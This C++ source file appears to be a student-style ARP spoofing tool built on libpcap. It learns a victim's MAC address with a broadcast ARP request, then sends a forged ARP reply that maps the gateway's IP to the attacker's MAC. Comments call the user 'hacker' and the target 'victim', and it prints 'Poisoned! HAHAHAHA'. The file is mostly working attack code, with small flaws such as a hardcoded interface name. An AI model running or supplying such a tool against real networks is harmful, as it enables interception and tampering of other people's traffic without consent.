#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <stdio.h>
#include <cstring>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

// https://technote.kr/176
void getIP(char* IP){
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, "enp0s3", IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Error");
    }
    else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
                  IP,sizeof(struct sockaddr));
    }
}

// https://community.onion.io/topic/2441/obtain-the-mac-address-in-c-code/3
void getMac(char* MAC, char** argv){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    char temp[10];

    strcpy(s.ifr_name, argv[1]);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (int i = 0; i < 6; ++i) {
            sprintf(temp, "%02x:", (unsigned char)s.ifr_addr.sa_data[i]);
            strcpy(MAC+ i * 3, temp);
        }
        MAC[17] = '\0';     // if not xx:xx:xx:xx: => get rid of last :
    }
}

// searching victim's MAC address
void WhereRU(char** argv, pcap_t* handle, char* senderMAC, char* myMAC, char* myIP){
    EthArpPacket ethpacket;
    char temp[10];

    ethpacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    ethpacket.eth_.smac_ = Mac(myMAC); // hacker MAC
    ethpacket.eth_.type_ = htons(EthHdr::Arp);
    ethpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    ethpacket.arp_.pro_ = htons(EthHdr::Ip4);
    ethpacket.arp_.hln_ = Mac::SIZE;
    ethpacket.arp_.pln_ = Ip::SIZE;
    ethpacket.arp_.op_ = htons(ArpHdr::Request);
    ethpacket.arp_.smac_ = Mac(myMAC); // hacker MAC
    ethpacket.arp_.sip_ = htonl(Ip(myIP)); // hacker IP
    ethpacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
    ethpacket.arp_.tip_ = htonl(Ip(argv[2]));// victim IP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ethpacket), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    // collect target MAC address
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        // if arp header 0806
        if (((uint8_t)packet[12] == 0x08) && ((uint8_t)packet[13] == 0x06)){
            for (int i = 0; i < 6; i++) {
                sprintf(temp, "%02x:", packet[i + 6]);
                strcpy(senderMAC + i * 3, temp);
            }
            senderMAC[17] = '\0';   // if not xx:xx:xx:xx: => get rid of last :
            break;
        }
    }
}

// ARP Poisoning
void Venom(char** argv, pcap_t* handle, char* senderMAC, char* myMAC){
    EthArpPacket ethpacket;
    ethpacket.eth_.dmac_ = Mac(senderMAC); // victim MAC
    ethpacket.eth_.smac_ = Mac(myMAC); // me hacker MAC
    ethpacket.eth_.type_ = htons(EthHdr::Arp);
    ethpacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    ethpacket.arp_.pro_ = htons(EthHdr::Ip4);
    ethpacket.arp_.hln_ = Mac::SIZE;
    ethpacket.arp_.pln_ = Ip::SIZE;
    ethpacket.arp_.op_ = htons(ArpHdr::Reply);
    ethpacket.arp_.smac_ = Mac(myMAC); // me hacker MAC
    ethpacket.arp_.sip_ = htonl(Ip(argv[3])); // gateway
    ethpacket.arp_.tmac_ = Mac(senderMAC); // victim MAC
    ethpacket.arp_.tip_ = htonl(Ip(argv[2]));// victim IP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&ethpacket), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    printf("Poisoned! HAHAHAHA :) \n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    char myMAC[30];
    char myIP[30];
    char senderMAC[30];

    getIP(myIP);
    getMac(myMAC, argv);
    printf("Hacker IP >> %s\n", myIP);
    printf("Hacker MAC >> %s\n", myMAC);

    WhereRU(argv, handle, senderMAC, myMAC, myIP);
    Venom(argv, handle, senderMAC, myMAC);

    pcap_close(handle);

    return 0;
}
